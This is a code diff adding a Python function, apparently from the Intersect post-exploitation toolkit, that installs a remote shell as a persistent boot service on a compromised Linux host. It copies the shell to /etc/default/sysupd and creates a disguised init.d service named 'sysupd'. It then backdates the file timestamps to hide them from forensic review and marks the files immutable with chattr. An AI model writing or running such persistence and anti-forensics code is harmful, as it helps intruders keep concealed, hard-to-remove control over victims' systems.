@@ -1,0 +1,43 @@
+
+# Lets you install an Intersect shell as a persistent service on the target. You must define your shell type and file location when prompted.
+def persistent():
+	header = " => "
+	print("Full path of your Intersect script: ")
+	currentfile = raw_input("%s " % (header))
+
+	if os.path.exists(currentfile) is True:
+		shutil.copy2(currentfile, "/etc/default/sysupd")
+	else:
+		print("[!] Incorrect file path, Try again!")
+		persistent()
+
+
+	print("Specify which shell to use: ")
+	shell = raw_input("%s " % (header))
+
+	if shell in modList is False:
+		print("[!] Shell module not loaded!")
+		persistent()
+	else:
+		if os.path.isdir("/etc/init.d"):
+			serwrite = open("/etc/init.d/sysupd", "w")
+			serwrite.write("#!/bin/sh\ncd /etc/default/\nsudo python sysupd --%s &" % shell)
+			serwrite.close()
+			os.system("chmod +x /etc/init.d/sysupd")
+			os.system("update-rc.d sysupd defaults")
+			print("[+] Persistent service installed.")
+			print("[+] Modifying touch times on shell files...")
+			os.system("touch -t 200512311216 /etc/default/sysupd")
+			os.system("touch -t 200512311216 /etc/init.d/sysupd")
+			print("[+] Attempting to lock down shell files...")
+			if whereis('chattr') is not None:
+				os.system("chattr +i /etc/default/sysupd")
+				os.system("chattr +i /etc/init.d/sysupd")
+			else:
+				print("[!] Chattr not found. Could not lock files.")
+
+			print("[+] Persistent shell successfull! System will now start your shell as a background process on every reboot.")
+
+
+
+
